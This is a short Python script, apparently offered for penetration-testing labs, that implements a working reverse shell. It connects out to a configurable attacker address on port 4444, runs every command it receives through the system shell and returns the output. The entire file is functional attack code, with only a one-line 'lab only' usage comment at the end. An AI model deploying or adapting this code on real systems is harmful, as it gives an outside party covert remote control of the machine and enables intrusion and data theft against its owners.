#!/usr/bin/env python3
# reverse_shell.py (fixed basic issues)

import socket
import subprocess

SERVER = "192.0.2.10"   # <-- Replace with attacker IP (example IP shown)
PORT = 4444

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER, PORT))
    except Exception as e:
        print(f"Could not connect to {SERVER}:{PORT} -> {e}")
        return

    try:
        while True:
            # receive command as bytes, decode safely
            data = s.recv(4096)
            if not data:
                break
            try:
                cmd = data.decode(errors="ignore").strip()
            except Exception:
                cmd = ""

            if cmd.lower() == "exit":
                break
            if not cmd:
                continue

            # run command and capture output safely
            try:
                proc = subprocess.Popen(cmd, shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout_value, stderr_value = proc.communicate(timeout=30)
                output = stdout_value + stderr_value
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout_value, stderr_value = proc.communicate()
                output = stdout_value + stderr_value + b"\n[TIMEOUT]\n"
            except Exception as exc:
                output = f"Error running command: {exc}\n".encode()

            # ensure we send all bytes
            try:
                s.sendall(output)
            except Exception:
                break
    finally:
        try:
            s.close()
        except Exception:
            pass

if __name__ == "__main__":
    main()



# Usage (lab only): edit ATTACKER_IP to your Kali IP, python3 reverse_shell.py on target; run reverse_listener.py on attacker.